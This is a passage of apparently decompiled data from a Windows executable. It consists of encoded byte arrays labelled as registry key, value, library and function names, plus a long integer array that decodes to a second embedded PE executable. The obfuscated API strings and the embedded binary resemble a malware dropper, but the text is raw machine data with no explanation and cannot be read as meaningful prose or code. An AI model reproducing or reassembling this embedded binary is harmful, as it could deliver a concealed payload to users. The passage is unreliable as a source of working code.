  '\b',
  '½',
  '\x1D',
  'E',
  'E',
  '\x1D',
  '1',
  '\x15',
  '\x1D',
  'A',
  'ù',
  '½',
  'E',
  '1',
  '½',
  'E',
  '\x15',
  'A',
  '0',
  ']',
  '\x19',
  ')',
  'ˆ',
  '\x01',
  '5',
  'i',
  'ù',
  '½',
  '½',
  '¡',
  '\x81',
  '0',
  'I',
  'U',
  '!',
  'ˆ',
  '1',
  'E',
  '5',
  '9',
  '\x1D',
  '0',
  '\x11',
  '=',
  'A',
  'ˆ',
  'é',
  'ù',
  ')',
  'I',
  'I',
  'E',
  '\r',
  'I',
  'I',
  '0',
  'Y',
  ')',
  '-',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  '=',
  'I',
  'h',
  'ˆ'
}; // idb
char a0[1] = "0"; // idb
char a0yiy[4] = "0YiY"; // weak
CHAR SubKey[2] = "Å5"; // idb
char a8[3] = "©-8"; // weak
char asc_410354[2] = "\r\b"; // weak
char a1 = '1'; // weak
char a5uA[6] = ")5U\b\rA"; // weak
char aAm1y[6] = "Åm=\r1Y"; // weak
char byte_410590 = '‘'; // idb
char aU[2] = "Ù)"; // idb
char byte_4106E6[128] =
{
  '…',
  ')',
  'A',
  '-',
  'E',
  'Y',
  '=',
  '\r',
  'E',
  'ˆ',
  '±',
  '\x1D',
  'U',
  '\b',
  'm',
  '\x1D',
  '\r',
  'A',
  'ˆ',
  'Å',
  '\r',
  '-',
  '1',
  'Y',
  '\b',
  'Ñ',
  '\r',
  '9',
  '\x1D',
  '1',
  'Y',
  '-',
  '1',
  '\x1D',
  '\x14',
  'E',
  '\b',
  '™',
  '\r',
  'm',
  'ˆ',
  '\x8D',
  '9',
  '9',
  ')',
  '\r',
  '9',
  '9',
  '5',
  'U',
  '=',
  '\r',
  'E',
  'ˆ',
  '\x8D',
  'I',
  'A',
  '-',
  '9',
  '\b',
  '‘',
  '5',
  '5',
  '9',
  'E',
  '\x14',
  '\b',
  '™',
  '\r',
  'm',
  'ˆ',
  '¹',
  '\r',
  '\x19',
  'm',
  '\b',
  '™',
  '\r',
  'm',
  'ˆ',
  '\x8D',
  'E',
  'E',
  ']',
  '=',
  'I',
  'Y',
  '-',
  '5',
  '1',
  'ˆ',
  '…',
  '\r',
  '1',
  '\x19',
  '9',
  '\x1D',
  '=',
  '\r',
  'E',
  'ˆ',
  '\x8D',
  '9',
  '9',
  '\b',
  'Å',
  '5',
  ']',
  '9',
  'E',
  '\x14',
  '™',
  '\r',
  'm',
  'ˆ',
  '\x9D',
  'I',
  '-',
  'I',
  ')',
  '\r',
  '1',
  'm',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ'
}; // idb
char aIim[6] = "©\rIIm\b"; // weak
char asc_410776[1] = "x"; // idb
char byte_41077D = '¼'; // idb
CHAR ValueName = '­'; // idb
char byte_41079D = '½'; // idb
char byte_4107E1 = '…'; // idb
char aX4[2] = "x4"; // idb
char byte_410867 = '…'; // idb
char asc_4108C1[2] = "\r]"; // weak
char byte_4108FB = '¼'; // idb
char aUE[5] = "Ù)-E\b"; // idb
char aU_0 = 'µ'; // weak
char aO = 'õ'; // weak
char byte_410B1B[120] =
{
  '\x8D',
  '±',
  'Ù',
  '­',
  '<',
  'Ñ',
  '­',
  'Á',
  '0',
  '™',
  '\x8D',
  'Ù',
  'ˆ',
  '…',
  '©',
  '¥',
  '¹',
  '­',
  'Å',
  'Ù',
  '0',
  '™',
  '\x8D',
  'Ù',
  'ˆ',
  '…',
  '©',
  '¥',
  '¹',
  '­',
  'Å',
  'Ù',
  '0',
  '½',
  'Å',
  'ˆ',
  '…',
  '©',
  '¥',
  '¹',
  '­',
  'Å',
  'Ù',
  '0',
  '…',
  'É',
  'Å',
  'ˆ',
  '…',
  '©',
  '¥',
  '¹',
  '­',
  'Å',
  'Ù',
  '0',
  'Ù',
  '\x8D',
  'Ñ',
  'ˆ',
  '­',
  'Ñ',
  '\x81',
  '0',
  '±',
  'Ù',
  'á',
  'ˆ',
  'Å',
  '½',
  '\x8D',
  'Á',
  'Ù',
  '…',
  '©',
  '¥',
  '0',
  '½',
  'Å',
  'ˆ',
  'Å',
  '½',
  '\x8D',
  'Á',
  'Ù',
  '…',
  '©',
  '¥',
  '0',
  '…',
  'É',
  'Å',
  'ˆ',
  '\x8D',
  'Ñ',
  '•',
  'Í',
  'Ù',
  '0',
  '™',
  '\x8D',
  'Ù',
  'ˆ',
  '\x8D',
  '•',
  'Ý',
  '\x8D',
  'Á',
  '™',
  '0',
  '™',
  '\x8D',
  'Ù',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ'
}; // idb
CHAR LibFileName[8] = "Å)9U\rI-0"; // idb
char aAA[3] = "Å-A"; // weak
CHAR ProcName[1] = "Á"; // idb
char byte_410CFB[40] =
{
  '\x9D',
  'é',
  'É',
  '¹',
  'µ',
  'Á',
  '\x9D',
  'Á',
  'ˆ',
  '…',
  '½',
  '½',
  '•',
  'Á',
  'ˆ',
  '=',
  'E',
  '-',
  '=',
  '1',
  'ˆ',
  '-',
  '\x05',
  'U',
  '\x05',
  '5',
  '1',
  '1',
  'ˆ',
  'U',
  '-',
  '1',
  'a',
  '-',
  'I',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ',
  'ˆ'
}; // idb
char byte_410D2B = '\x1C'; // idb
char aE = 'E'; // weak
_UNKNOWN unk_410DAC; // weak
char String2[4] = "0A\rA"; // idb
CHAR aU11[5] = "U-1-1"; // idb
CHAR byte_410DF0[20] =
{
  '™',
  '-',
  'A',
  '\x1D',
  '\x05',
  'Y',
  '5',
  'A',
  'm',
  'ˆ',
  '\x19',
  '9',
  '9',
  '\x05',
  '\r',
  '\x05',
  ')',
  '\x1D',
  'ˆ',
  'ˆ'
}; // idb
CHAR Name[1] = "Å"; // idb
char aU_1 = 'U'; // weak
char aA5[2] = "Å5"; // weak
_UNKNOWN unk_410EB4; // weak
char Format = '¥'; // idb
int dword_41133C = 1; // weak
int dword_411340[1386] =
{
  16,
  29,
  32,
  120,
  136,
  373,
  12,
  389,
  28,
  421,
  83,
  526,
  14,
  566,
  14,
  606,
  14,
  646,
  14,
  664,
  1384,
  2080,
  96,
  4098,
  10,
  4114,
  22,
  4195,
  157,
  5132,
  2292,
  9718,
  522,
  5265997,
  2,
  983044,
  65535,
  184,
  0,
  1704000,
  424,
  234885306,
  -855002081,
  1275181089,
  -1869602355,
  1936287828,
  1869770784,
  1835102823,
  1937075488,
  1700929652,
  1853190688,
  1684960544,
  1461744229,
  842231401,
  925108749,
  17744,
  262476,
  -2062799733,
  0,
  0,
  -2121400096,
  419561739,
  1024,
  3072,
  0,
  4096,
  4096,
  8192,
  4194304,
  4096,
  1024,
  1,
  0,
  655363,
  0,
  24576,
  1024,
  0,
  2,
  1048576,
  8192,
  1048576,
  4096,
  0,
  12304,
  16484,
  1146045200,
  69,
  1048576,
  1048576,
  262144,
  1074266112,
  1156579328,
  4281409,
  0,
  16,
  32,
  4,
  16396,
  1684614848,
  6386785,
  1048576,
  3145728,
  262144,
  1074790400,
  784334848,
  1869374834,
  -167772061,
  17,
  64,
  20,
  16404,
  8644944,
  199753728,
  1778384896,
  714752,
  0,
  637468672,
  4206644,
  808986111,
  2101312,
  1459845120,
  -396321711,
  0,
  767397213,
  -1962934270,
  -2128337828,
  -536870685,
  850759167,
  -402653183,
  214,
  1378571661,
  -2024907379,
  13166814,
  -2117926912,
  1085421,
  12943616,
  -956301296,
  -530055099,
  1170605203,
  1820917764,
  -1654580188,
  57599,
  -396361673,
  0,
  896896349,
  38376,
  1958742784,
  233178402,
  -259325952,
  43240,
  1187472896,
  855638268,
  1364480457,
  1364283473,
  41391615,
  1633222656,
  855638211,
  -1191234816,
  27298,
  -395545203,
  90,
  -65047472,
  1972238475,
  -1403679323,
  735663403,
  267518962,
  1459375799,
  -1956731661,
  -166987658,
  -1017581707,
  3342300,
  395160713,
  -2293796,
  -863197055,
  -71913700,
  9222028,
  -2282423,
  -1961036580,
  1072654547,
  -1785942132,
  1780721886,
  -2294261,
  -192830331,
  1996438556,
  1829116,
  -949616640,
  64582,
  1591148374,
  -1661188465,
  -62488218,
  48786076,
  -1660944384,
  1449196739,
  -61437089,
  257491050,
  1712312740,
  -1036818771,
  -136139930,
  758236001,
  -1320091528,
  758197721,
  -1604030415,
  509704052,
  483281400,
  -1408195499,
  741420530,
  1260017969,
  2004620976,
  1857739844,
  1274162701,
  1751193008,
  1840957508,
  -1494077879,
  -30269087,
  654844602,
  1656420420,
  695931957,
  -469573564,
  1932567125,
  636923503,
  625342010,
  -985376580,
  -758197677,
  -973976404,
  758197553,
  -2106482583,
  158705249,
  -1783520735,
  506539313,
  758247153,
  1691156607,
  -537846175,
  -54099369,
  -563708808,
  -1028492646,
  -1503038411,
  -567145151,
  -567141446,
  2086731522,
  1948876042,
  1868568901,
  757056865,
  -798610127,
  555049402,
  1922976707,
  2144622697,
  1438284411,
  583675413,
  -1503250042,
  -701353655,
  782645690,
  2042131170,
  1953180094,
  -295114541,
  2010007395,
  -314867251,
  -50120379,
  -941611647,
  -542102718,
  -1073107439,
  -549132849,
  2007223002,
  1380273091,
  860636494,
  -811988174,
  -367827659,
  539406794,
  -826440181,
  -1819879047,
  -1029395602,
  -517600535,
  116895384,
  -567273241,
  871930566,
  -1643349585,
  -2018384917,
  1319410241,
  -1366527561,
  -184879449,
  703995353,
  1140850902,
  1282927088,
  -1921521171,
  2054678827,
  2004346981,
  -931665797,
  -1703417690,
  1920460977,
  1417144483,
  444065928,
  427288786,
  -59250480,
  -1267209890,
  41412874,
  1366813057,
  360179964,
  427289112,
  -730339012,
  -898111347,
  611838027,
  595060877,
  276294016,
  1652025701,
  1954015583,
  293070923,
  -1837635161,
  444066105,
  -1502090849,
  -696784704,
  -831002138,
  -713561177,
  796388268,
  1937238958,
  1680761702,
  -1593807764,
  -754974684,
  1299617833,
  1680757328,
  -754946964,
  1924395763,
  1845493762,
  -881522288,
  -1233843824,
  1433733434,
  861029715,
  -94097870,
  9349947,
  -510472448,
  -515963785,
  -1593835401,
  15228932,
  1560281088,
  -1248993397,
  3879,
  -155160,
  1518604287,
  855638020,
  -2054334986,
  1136,
  1690317648,
  -1989922561,
  -1778428128,
  -192,
  80,
  0,
  3213312,
  258048,
  27875072,
  1946157056,
  -18840821,
  -1778428080,
  -188,
  1780640342,
  23746051,
  104,
  -1778427968,
  -196,
  92540736,
  1207959556,
  -191001264,
  1392508943,
  1393083267,
  1393083267,
  1284898640,
  1375731711,
  611647316,
  1419116296,
  1509949439,
  -1148973248,
  1207959555,
  -2062563061,
  946,
  -947808432,
  9030,
  1784043350,
  1962890756,
  -1778444252,
  -168,
  -2079342581,
  889,
  1448499024,
  -11533718,
  -41835,
  264244223,
  220804,
  -1517727744,
  1050,
  1102417299,
  -402653176,
  -810,
  1284207476,
  -108984284,
  8192,
  53379599,
  56623104,
  -2083836984,
  -125105943,
  1970432440,
  66028403,
  200990895,
  712335817,
  -473936501,
  -2134941653,
  721420290,
  1373408231,
  -9809065,
  1077703935,
  6947178,
  1485592063,
  -16749996,
  199689168,
  -2062589504,
  740,
  340834063,
  1410356363,
  2055328515,
  1852397328,
  1712092506,
  1762949761,
  -981201040,
  855638018,
  1941278207,
  -402653176,
  -946,
  51137163,
  -242546614,
  50588097,
  608975822,
  -1585049848,
  50331650,
  1379828211,
  1948349025,
  678988748,
  141800845,
  535298048,
  738197500,
  2047018106,
  -1912929524,
  1053877,
  -1995470080,
  1334460750,
  1213106180,
  53394825,
  1065353216,
  50755049,
  -947715713,
  2139186693,
  1968265214,
  2139317767,
  -2055995389,
  1612466817,
  -1913651200,
  1053877,
  528860928,
  1207959554,
  -956301309,
  234373,
  1261056,
  -1982713088,
  154773,
  -1223689216,
  1418531920,
  -1031538672,
  -1962243288,
  -818214790,
  -108592522,
  -1089713661,
  896,
  160232,
  -1961790464,
  -114609030,
  55115649,
  -1945174016,
  361,
  817795,
  23036943,
  -108593152,
  -953926653,
  7,
  149521152,
  60001595,
  108789760,
  60001675,
  -1926692864,
  915,
  -2096869495,
  2025523399,
  185742422,
  1460630747,
  51149355,
  2083193978,
  2072577060,
  -1115070472,
  604,
  323263885,
  -214237184,
  12748559,
  -949616640,
  1364721223,
  1612466817,
  -1947205632,
  1586047064,
  2049663034,
  75105036,
  539261995,
  52673929,
  -947716096,
  880707847,
  10520715,
  -922025984,
  -108305292,
  141800845,
  -404226048,
  738197498,
  2047018106,
  612107020,
  871861024,
  -1376713783,
  -1951543157,
  149521352,
  1959922680,
  1926904633,
  -1031712020,
  4096,
  2002442811,
  870961632,
  1727695808,
  1958742957,
  268379421,
  -805109760,
  -394017909,
  1926249219,
  146834183,
  74633275,
  -538781813,
  -949892853,
  1450715200,
  1969230388,
  676890910,
  878082235,
  -385628654,
  539261995,
  51149355,
  2016085114,
  99582760,
  1627487113,
  35620295,
  3670016,
  727711744,
  2047020154,
  -1961194748,
  -164427654,
  58122043,
  54983559,
  147031001,
  91676475,
  -348358653,
  1962281975,
  -1980004606,
  142248218,
  -2119896223,
  4201546,
  1652637696,
  -517120228,
  322877951,
  283312128,
  59880,
  1468337920,
  -369098754,
  -438,
  -1248985293,
  2163,
  -394776,
  51022847,
  1485505610,
  1993030480,
  945292037,
  1485436907,
  139103056,
  990661123,
  1913136204,
  608995588,
  -967418360,
  -1918362554,
  193681496,
  63386339,
  0,
  136596619,
  870961489,
  112660434,
  -1031024637,
  -7551,
  -390004736,
  1188037392,
  -1947540922,
  283689410,
  1505887078,
  59359491,
  878082236,
  1076897810,
  872415280,
  3165744,
  3167744,
  0,
  3165696,
  3167744,
  0,
  1380272896,
  860636494,
  1818504754,
  108,
  1701597952,
  28773,
  1769489664,
  1869762676,
  1936942435,
  18696,
  760,
  -10447361,
  -1778384897,
  -184,
  1778412120,
  1962889216,
  -1778447324,
  -200,
  -14404353,
  -52075,
  -1924114177,
  1045661,
  -1014803712,
  -1014803704,
  -11513080,
  -44907,
  1217789951,
  -1,
  -47979,
  1690907647,
  1499005327,
  15254369,
  1476395008,
  1352941709,
  270812299,
  12091535,
  -1070399488,
  -896835389,
  -1248985293,
  2163,
  -452376,
  1640643583,
  1207959747,
  1610672896,
  59548,
  861732864,
  321782,
  1901527040,
  1784021099,
  179616258,
  -755009559,
  494190603,
  1784043094,
  431640578,
  -8918832,
  1958742994,
  -129645044,
  258510144,
  -13647741,
  1751227856,
  305419896,
  385876163,
  1414619136,
  6832234,
  1392508944,
  647364439,
  1509949434,
  -1017004021,
  1835008,
  545686925,
  1365245952,
  1073768532,
  1397751808,
  714473303,
  1509949434,
  -1017004021,
  1179648,
  1364480352,
  -11054256,
  -381291,
  -1072997889,
  50017,
  -396361182,
  0,
  -1249028771,
  517,
  1693856598,
  -1989921025,
  1572179238,
  1459617791,
  -494616,
  -1920245505,
  -1510,
  -1954067063,
  -384371,
  1988987391,
  -385875969,
  4,
  7041367,
  6969183,
  -771816854,
  158646283,
  110493520,
  -335544326,
  1789048878,
  -930414592,
  -130304627,
  183042047,
  1962934264,
  -125043686,
  -1196703693,
  4926,
  1958055339,
  -201326601,
  -826963548,
  1627389962,
  31630729,
  1972174848,
  -136320855,
  -2079326209,
  333,
  1972196183,
  -137369404,
  2021720063,
  -2079348708,
  313,
  -1474543418,
  4194489,
  -462058240,
  -543512,
  -1915188225,
  196533,
  -139991040,
  -629866497,
  -1926727541,
  209333,
  -141039616,
  -921960449,
  2055981172,
  -1531082492,
  -1962934271,
  139103034,
  41351483,
  -1115041913,
  426,
  -108803541,
  -494792888,
  -1962934272,
  32904,
  1959332608,
  1398758297,
  -1924015869,
  1458095221,
  1392508919,
  168670605,
  1256718336,
  268435447,
  -511653194,
  -1956750785,
  350979032,
  348357457,
  -485733493,
  -836022236,
  1073805697,
  426967040,
  -402127733,
  2088,
  1702065469,
  -579512206,
  2360519,
  -1962934256,
  1485527491,
  605815568,
  -1451913901,
  -589592,
  -1921878785,
  -152517515,
  -1946157066,
  1001258224,
  -349051,
  990672127,
  -348027,
  184841471,
  -2081693504,
  -1073019666,
  -293403787,
  -1996059900,
  1552654405,
  -1014954972,
  305419896,
  1450754945,
  512299572,
  -391547507,
  -2379,
  -2054346892,
  -163,
  -1923528598,
  -1561795467,
  1962934262,
  -2054333676,
  8326,
  4096,
  16,
  807219223,
  19592,
  888,
  4194489,
  -462058240,
  -619288,
  1450753279,
  -1249045964,
  2573,
  -623384,
  -1989779713,
  -1779893162,
  1694498806,
  429927,
  1633574400,
  59587,
  -1923612672,
  -1957636288,
  -1894767548,
  47232,
  -1010814208,
  3276800,
  59488,
  -1956839424,
  -507763,
  -1928666113,
  921186421,
  -335544330,
  -1178586345,
  20000,
  -1929068413,
  43189,
  -165681152,
  -253558785,
  50017,
  1784676468,
  -16619008,
  -507755,
  1958743039,
  -1114812317,
  24260,
  19400647,
  1347878912,
  -129722881,
  -1072955393,
  -1920252812,
  2212,
  -1923669277,
  182985823,
  1543503872,
  1819310181,
  1919251055,
  -1249026304,
  1895,
  -669464,
  242573311,
  -1928837237,
  43189,
  -172496896,
  1348009983,
  -1778429865,
  -1976,
  -1778403093,
  -2080,
  50017,
  1348468781,
  -9961366,
  -16777201,
  -521067,
  1958743039,
  -1147711464,
  4194304,
  -36391539,
  2062090239,
  -11,
  -532331,
  12804607,
  1358966272,
  -2123970253,
  1968852283,
  1011059488,
  -2123971837,
  1967476792,
  390133268,
  1393456416,
  -2141431670,
  -75432221,
  24468226,
  1506347841,
  620757187,
  -1223732992,
  1418531920,
  -1223690224,
  1228998216,
  -1031597853,
  74615592,
  -210567621,
  -147115517,
  -921965194,
  1560658777,
  -1251671949,
  1560632581,
  -860827560,
  -1257939708,
  -1560631292,
  -1250678648,
  -1560630788,
  1573578888,
  -1276289787,
  -788880655,
  1560562608,
  -1444498171,
  -393698566,
  -1560631023,
  1517805704,
  1673288965,
  -1593484010,
  -794710446,
  1560539312,
  -1446595323,
  -799366406,
  1561246642,
  193739525,
  -1445743111,
  -1350327558,
  1357113992,
  -731685627,
  -1729257133,
  1023058673,
  1520889283,
  -313619200,
  -1331237466,
  -342861781,
  1733225894,
  1616450130,
  307395355,
  94448217,
  715582904,
  312928737,
  793776592,
  715889063,
  298848929,
  -371119538,
  -307827267,
  -1951487391,
  710585185,
  -307830303,
  793776880,
  715692452,
  -1947146783,
  -1436439711,
  -307883606,
  -312112039,
  -1929362522,
  -307827378,
  707244710,
  307829245,
  -1717096624,
  1806264225,
  -501158679,
  -1292871744,
  -269392704,
  -1717293232,
  1713146798,
  -1171289256,
  -354342236,
  -486543924,
  -1717424304,
  -354342239,
  -499768171,
  107922375,
  -301072265,
  107873902,
  -1257010381,
  260501989,
  -1953367654,
  107714523,
  -172626322,
  -454100591,
  -961770387,
  1642988942,
  1097253245,
  319391357,
  321457833,
  -1049206290,
  -1938407066,
  -2039668056,
  244718601,
  -424797143,
  420054637,
  422121129,
  67089379,
  -1736046994,
  -1936590435,
  -2039668056,
  244719881,
  -424795863,
  705267309,
  707333801,
  -1551437339,
  1737619869,
  1708934339,
  1144267776,
  433865948,
  1103819089,
  775177436,
  -1306281169,
  1453868318,
  -1235631785,
  -1050952925,
  -1155287479,
  -1235631781,
  -246301917,
  -1155287427,
  -991975844,
  1277445818,
  -1508096374,
  -2080717601,
  -1571007788,
  1075496900,
  1276863068,
  1192937450,
  1276863068,
  1277068778,
  -841317742,
  20488,
  888,
  819824170,
  -1009089825,
  90031037,
  95749167,
  1482491229,
  28684496,
  129303901,
  -2002584914,
  -90112280,
  -139792990,
  -1868367198,
  -89984930,
  -1941770852,
  89681624,
  28410973,
  -111344292,
  -2133539474,
  89982483,
  3309780,
  -1868429987,
  -89984606,
  102924500,
  -155908771,
  -1906506401,
  72969633,
  1862927709,
  -221709731,
  -308086103,
  89982709,
  -1247628128,
  -101452031,
  89932443,
  90010549,
  -1410824099,
  -312670887,
  -89983028,
  -2057377827,
  299198111,
  1100637049,
  90637433,
  -1912332489,
  -1868410460,
  -89984602,
  204408417,
  2752865,
  89999285,
  559517533,
  2137114019,
  1693255467,
  -1904672299,
  914745234,
  83160477,
  959907165,
  119926018,
  624231773,
  -94567149,
  -89527608,
  -400012638,
  1812635318,
  628045363,
  1781492251,
  1400732968,
  1701653356,
  561607120,
  90047157,
  105901405,
  1508181341,
  -1367921801,
  -2064202386,
  89933233,
  -1092056995,
  1365050693,
  -758580725,
  1168308905,
  72122706,
  1427440989,
  24723882,
  89985629,
  98467922,
  -1311767203,
  89943417,
  127921501,
  -318110371,
  89982865,
  89915876,
  -1358842531,
  830042576,
  -1582431274,
  -1399983613,
  89992051,
  -1405404631,
  1411974515,
  24723882,
  89982285,
  246762537,
  2002584925,
  623146812,
  1613327124,
  -1912470225,
  -1328524413,
  89981299,
  -89354827,
  136928162,
  -2081912821,
  -312670887,
  -89983964,
  -1137741565,
  89982041,
  -103357322,
  1169531310,
  -2069693790,
  89915801,
  -234361251,
  117697933,
  -1194326691,
  89982825,
  -150730697,
  548893170,
  94567074,
  1965778016,
  948138333,
  86729779,
  -69807575,
  90123957,
  -115700131,
  90122933,
  1618163805,
  355033125,
  1714301792,
  -212569809,
  -89248296,
  136840866,
  -1328481322,
  -89985020,
  -89390667,
  71167394,
  1104151901,
  165020025,
  -99854983,
  -89530680,
  178065058,
  -89918760,
  -624362846,
  -2069693783,
  89933209,
  1520329821,
  1680700220,
  1680826417,
  1681091120,
  1798598963,
  1802395954,
  1798207021,
  1798201391,
  1798661678,
  1680750446,
  1983148587,
  1664312382,
  1663661680,
  1697609072,
  85986790,
  358464605,
  -596245155,
  -462027985,
  -206152692,
  -428417954,
  -1999239881,
  -89984914,
  1426657726,
  70719031,
  -727578825,
  757646678,
  -261453610,
  566164130,
  -2005323306,
  -1034608351,
  85984602,
  2043695709,
  -2012605063,
  1297162529,
  1393165012,
  -984165214,
  181821736,
  298870206,
  89982416,
  -786828707,
  89982885,
  -2007600803,
  -307113703,
  -89982246,
  836126646,
  1907035785,
  -308048282,
  89982021,
  -308067626,
  89982017,
  -89982344,
  1677801565,
  623445341,
  88037728,
  -2075889315,
  89915825,
  -1449030051,
  1889341431,
  -124457561,
  -1042482526,
  89982041,
  -1912232513,
  -89637168,
  240838306,
  1432252829,
  -1042492254,
  90011733,
  -1724004804,
  89982389,
  -1868408739,
  -89983772,
  114452710,
  781553245,
  1705280662,
  2002585015,
  219712595,
  -64573232,
  0,
  494,
  -1481246046,
  -1734149454,
  -314718660,
  89982301,
  -1881108992,
  -89982292,
  -1976516982,
  -965343906,
  89977318,
  1534029661,
  78088406,
  230557021,
  89570790,
  1531539293,
  472893030,
  1398268828,
  -198733662,
  -761070942,
  -313048876,
  89982298,
  -90013515,
  -308386654,
  89982297,
  86339602,
  87511554,
  -1868429513,
  -89983981,
  220841302,
  935918093,
  -962397524,
  1659406365,
  -308086094,
  -89986440,
  -2133587927,
  89982119,
  1338571277,
  -962397524,
  89915876,
  -1092581283,
  1381827909,
  -972906066,
  -982625267,
  -1414530328,
  -972727278,
  1549365004,
  53429345,
  120217441,
  -845404839,
  1554835285,
  1409286339,
  15228928,
  1560281088,
  -1959218948,
  -999507,
  1961692159,
  -398243025,
  44,
  -544738933,
  9192,
  1793033984,
  -247769032,
  344594039,
  -967617997,
  1392521988,
  198573911,
  -2007344192,
  -764071148,
  -1017004021,
  868233815,
  -1359853111,
  1238497119,
  603979971,
  15228928,
  1560281088,
  3560,
  1835365376,
  1683763763,
  1633905772,
  -1923153821,
  1726521973,
  1644167150,
  918693059,
  606749696,
  2042766530,
  -729173699,
  75225917,
  657276492,
  654570755,
  747578638,
  -174390104,
  298276650,
  -906319902,
  1615581472,
  -1381748506,
  -617852857,
  -838777539,
  -1375704197,
  -830746989,
  1945539451,
  830750302,
  825020177,
  831798254,
  -1162099324,
  1336100200,
  -813969776,
  -1362214021,
  646197653,
  830743426,
  -2022626014,
  -70892758,
  629420427,
  -830724434,
  -1123103109,
  -62342114,
  1005465979,
  -981192300,
  1164098235,
  -829403229,
  1132187515,
  831233990,
  -1362214012,
  646197653,
  830743494,
  49946
}; // idb
int dword_4128F0 = 6044257; // weak
int dword_412900 = 1; // weak
int (__cdecl *off_412910)(_DWORD) = &sub_40A24A; // weak
int dword_412914 = 2; // weak
char byte_412918[8] = { '\x01', '\x02', '\x04', '\b', '\0', '\0', '\0', '\0' }; // idb
_UNKNOWN unk_412920; // weak
_UNKNOWN unk_412924; // weak
_UNKNOWN unk_412930; // weak
__int16 *off_412A10[2] = { &word_412A1A, &word_412A1A }; // weak
__int16 word_412A1A[] = { 32 }; // weak
int cbMultiByte = 1; // idb
char byte_412C20 = '.'; // weak
char *off_412C28 = "(null)"; // weak
wchar_t *off_412C2C = L"(null)"; // weak
char asc_412C30[6] = " \t-\r]"; // weak
char asc_412C38[2] = "]"; // weak
int dword_412C40[30] =
{
  -1073741819,
  11,
  0,
  -1073741795,
  4,
  0,
  -1073741674,
  4,
  0,
  -1073741683,
  8,
  0,
  -1073741682,
  8,
  0,
  -1073741681,
  8,
  0,
  -1073741680,
  8,
  0,
  -1073741679,
  8,
  0,
  -1073741678,
  8,
  0,
  -1073741677,
  8,
  0
}; // idb
_UNKNOWN unk_412C48; // weak
int dword_412CB8 = 3; // weak
int dword_412CBC = 7; // weak
int dword_412CC0 = 10; // weak
int dword_412CC4 = 140; // weak
_UNKNOWN unk_412CC8; // weak
_DWORD dword_412CD4[5] = { 429065504, 0, 0, 0, 0 }; // idb
int dword_412CE8[] = { 2 }; // weak
char *off_412CEC = "R6002\r\n- floating point not loaded\r\n"; // weak
_UNKNOWN unk_412D78; // weak
_UNKNOWN unk_412DA0; // weak
_UNKNOWN unk_412DC0; // weak
int (__cdecl *off_413000)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = &sub_40C421; // weak
int (__cdecl *off_413004)(_DWORD) = &sub_40C421; // weak
int (__cdecl *off_413008)(_DWORD, _DWORD, _DWORD) = &sub_40C421; // weak
int (__cdecl *off_41300C)(_DWORD) = &sub_40C421; // weak
int dword_413020 = 1016; // weak
_UNKNOWN unk_413030; // weak
int dword_413034[89] =
{
  22,
  2,
  2,
  3,
  2,
  4,
  24,
  5,
  13,
  6,
  9,
  7,
  12,
  8,
  12,
  9,
  12,
  10,
  7,
  11,
  8,
  12,
  22,
  13,
  22,
  15,
  2,
  16,
  13,
  17,
  18,
  18,
  2,
  33,
  13,
  53,
  2,
  65,
  13,
  67,
  2,
  80,
  17,
  82,
  13,
  83,
  13,
  87,
  22,
  89,
  11,
  108,
  13,
  109,
  32,
  112,
  28,
  114,
  9,
  6,
  22,
  128,
  10,
  129,
  10,
  130,
  9,
  131,
  22,
  132,
  13,
  145,
  41,
  158,
  13,
  161,
  2,
  164,
  11,
  167,
  13,
  183,
  17,
  206,
  2,
  215,
  11,
  1816,
  12
